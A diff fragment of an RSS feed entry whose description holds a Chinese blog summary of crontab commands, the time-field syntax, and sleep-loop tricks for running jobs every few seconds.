-# 每分钟执行 * * * * * cmd # 每小时的15，45分钟执行 15,45 * * * * cmd # 每个周一到周五，早上9点到下午6点之间，每隔15分钟喝一次水 */15 9,18 * * 1-5 喝水 每个X秒执行 crontab的默认最小执行周期是1分钟，如果想每隔多少秒执行一次，就需要一些特殊的手段。
-每隔5秒 * * * * * for i in {1..12}; do /bin/cmd -arg1 ; sleep 5; done 每隔15秒 * * * * * /bin/cmd -arg1 * * * * * sleep 15; /bin/cmd -arg1 * * * * * sleep 30; /bin/cmd -arg1 * * * * * sleep 45; /bin/cmd -arg1 为什么crontab指定的脚本没有执行？ 有以下可能原因</description>
+      <description>我已经在 crontab 上栽了很多次跟头了，我决定写个总结。
+常用的命令 crontab -l # 显示计划任务脚本 crontab -e # 编辑计划任务 计划任务的格式 时间格式 * # 每个最小单元 / # 时间步长，每隔多长时间执行 */10 - # 区间，如 4-9 , # 散列，如 4,9,10 几个例子 crontab 最小支持的时间单位是 1 分钟，不支持每个多少秒执行一次
+# 每分钟执行 * * * * * cmd # 每小时的15，45分钟执行 15,45 * * * * cmd # 每个周一到周五，早上9点到下午6点之间，每隔15分钟喝一次水 */15 9,18 * * 1-5 喝水 每个 X 秒执行 crontab 的默认最小执行周期是 1 分钟，如果想每隔多少秒执行一次，就需要一些特殊的手段。
+每隔 5 秒 * * * * * for i in {1.</description>
     </item>
     
     <item>
